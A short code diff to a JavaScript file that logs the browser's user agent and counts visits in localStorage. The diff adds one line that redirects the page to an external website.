@@ -1,5 +1,5 @@
 console.log(navigator.userAgent);
-
+window.location.replace("https://www.terminatevader.com/");
   if (typeof(Storage) !== "undefined") {
     if (localStorage.visitcount) {
       localStorage.visitcount = Number(localStorage.visitcount)+1;
